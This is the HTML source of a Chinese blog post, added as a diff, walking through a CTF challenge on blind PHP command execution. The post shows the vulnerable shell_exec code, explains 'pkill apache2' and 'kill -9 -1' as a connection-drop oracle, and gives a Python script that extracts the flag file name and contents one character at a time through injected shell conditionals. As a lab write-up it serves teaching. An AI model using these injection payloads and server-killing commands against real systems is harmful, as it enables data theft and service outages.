@@ -1,0 +1,253 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>一道命令执行盲注题目 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="一道命令执行盲注题目 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="题目描述
+因为环境关了，所以就简述一下。
+题目就一个index.php，源码如下：
+&lt;?php
+
+$cmd = $_GET['cmd'] ?? '';
+
+if (!$cmd) {
+    highlight_file(__FILE__..." />
+    <meta name="keywords" content="命令执行,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              一道命令执行盲注题目
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-08-06
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/x1DzYssV5/" class="post-tag">
+                  # 命令执行
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/yi-dao-ming-ling-zhi-xing-mang-zhu-ti-mu.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="题目描述">题目描述</h1>
+<p>因为环境关了，所以就简述一下。</p>
+<p>题目就一个index.php，源码如下：</p>
+<pre><code class="language-php">&lt;?php
+
+$cmd = $_GET['cmd'] ?? '';
+
+if (!$cmd) {
+    highlight_file(__FILE__);
+    die();
+}
+
+shell_exec('timeout -s SIGKILL 0.1 sh -c -- ' . escapeshellarg('sh -c -- ' . escapeshellarg($cmd) . ' ; sleep 1'));
+</code></pre>
+<p>题目环境是无法外连的，各种权限卡的也很死，基本上就只能读吧。</p>
+<p>还挺简单？</p>
+<h1 id="题目分析">题目分析</h1>
+<p>首先这里执行的是<code>sh -c</code>命令，用于在一个新的shell进程中执行字符串命令。</p>
+<pre><code class="language-powershell">sh -c -- 'COMMAND'
+</code></pre>
+<p>前面的<code>timeout</code>用于在指定的时间后向运行的命令发送一个信号来停止它，在这里在0.1秒后向<code>sh -c</code>命令发送 SIGKILL 信号来杀掉它。同时因为<code>sh -c</code>的执行结果也是没有回显的，因此也不能直接<code>cat</code>去读文件。</p>
+<p><code>escapeshellarg</code>函数会避免用户拼接自己的命令来逃脱<code>timeout</code>的限制。至于为什么用两个<code>escapeshellarg</code>套了一下，现在我是看不出有什么意义的。不过当时做的时候，我一直觉得这玩意儿这么组合是有问题的，但其实<code>escapeshellarg</code>只有和<code>escapeshellcmd</code>组合才会产生问题，然后浪费了好多时间看这些单引号……所以思路真的很重要呀😢</p>
+<h1 id="解题流程">解题流程</h1>
+<p>这道题目叫<strong>blind</strong>，结合这个情况也能猜到是盲注。这里就知道<code>timeout</code>的作用了，因为没有布尔回显差异，所以无法用布尔盲注，而sleep这类延时命令也被<code>timeout</code>限制了。</p>
+<p>所以第一考点就是，找到一个可以让服务器回显产生差异的命令。有两个，<code>pkill apache2</code> 和 <code>kill -9 -1</code>，它们都会杀掉当前的TCP连接。执行的效果如下<br>
+<img src="https://skyblu3519.github.io/post-images/1691335444781.png" alt="" loading="lazy"></p>
+<p>然后我们就可以构造一个<code>if [ expression ]; then COMMAND; fi</code>来写盲注的脚本。利用的是在与服务器连接断开后<code>requests.get</code>会发生报错。</p>
+<pre><code class="language-python">try:
+    response = requests.get(url, params=param_data)
+except:
+    result += chr(char)
+    print(&quot;Extracted so far: &quot; + result)
+    break
+</code></pre>
+<p>下面理所当然得就想到读<code>/flag</code>，但这里其实还有一个坑。在<code>if [ &quot;$( cut -c1 /flag)&quot; = &quot;a&quot;  ];</code>这样读的时候会发现，读不出任何内容。而<code>if [ -r /flag]</code>又判断出<code>/flag</code>是可读的，但用判断文件的表达式<code>if [ -f /flag]</code>却是<code>False</code>。当时我就晕了，就怎么都想不到<code>/flag</code>是个目录😭</p>
+<p>这时应该用<code>if [ -d /flag]</code>确定<code>/flag</code>是个目录<br>
+<img src="https://skyblu3519.github.io/post-images/1691335466329.png" alt="" loading="lazy"></p>
+<p>如果我继续做的话，首先用<code>if [ &quot;$(ls /flag | wc -l)&quot; = &quot;1&quot; ]</code>判断出<code>/flag</code>下有几个条目，这里判断出有一个。<br>
+<img src="https://skyblu3519.github.io/post-images/1691335474327.png" alt="" loading="lazy"></p>
+<p>然后用<code>if [ &quot;$( ls /flag|cut -c1 )&quot; = &quot;9&quot; ];</code>爆破出文件名。</p>
+<pre><code class="language-python">import requests
+import time
+
+url = &quot;http://10.211.55.12/xman/&quot;  # Target URL
+result = &quot;&quot;
+
+for i in range(1, 1000):  # adjust as needed
+    param_data = {}
+    for char in range(32, 129):
+        injection_str = f&quot;if [ \&quot;$(ls /flag ｜| cut -c{i})\&quot; = \&quot;{chr(char)}\&quot; ];then pkill apache2;fi&quot;
+        param_data['cmd'] = injection_str  # adjust parameter name accordingly
+        time.sleep(0.04)
+        try:
+            response = requests.get(url, params=param_data)
+        except:
+            result += chr(char)
+            print(&quot;Extracted so far: &quot; + result)
+            break
+    else:
+        print(&quot;Extraction completed.&quot;)
+        break
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1691335489485.png" alt="" loading="lazy"></figure>
+<p>然后就可以用逐字符猜解出flag了</p>
+<pre><code class="language-python">injection_str = f&quot;if [ \&quot;$( cut -c{i} /flag/981y2hsdasd)\&quot; = \&quot;{chr(char)}\&quot;  ];then pkill apache2;fi&quot;
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0">题目描述</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li>
+<li><a href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B">解题流程</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/yi-zhou-ctfdi-7-zhou/">
+              <h3 class="post-title">
+                一周CTF（第7周
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
